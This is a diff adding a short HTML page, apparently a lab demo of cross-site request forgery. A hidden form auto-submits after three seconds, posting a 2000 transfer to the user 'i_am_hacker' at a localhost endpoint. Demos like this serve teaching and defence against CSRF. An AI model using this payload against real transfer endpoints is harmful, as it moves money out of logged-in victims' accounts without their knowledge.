@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+</head>
+<body>
+  <h1>Just Visit Me And I Will Hack You! (Wait for 3 seconds 😜)</h1>
+
+  <form id="form" action="http://localhost:3000/transfer" method="post">
+    <input type="hidden" name="username" value="i_am_hacker">
+    <input type="hidden" name="amount" value="2000">
+    <button type="submit"></button>
+  </form>
+
+  <script>
+    setTimeout(() => {
+      document.getElementById('form').submit()
+    }, 3000)
+  </script>
+</body>
+</html>
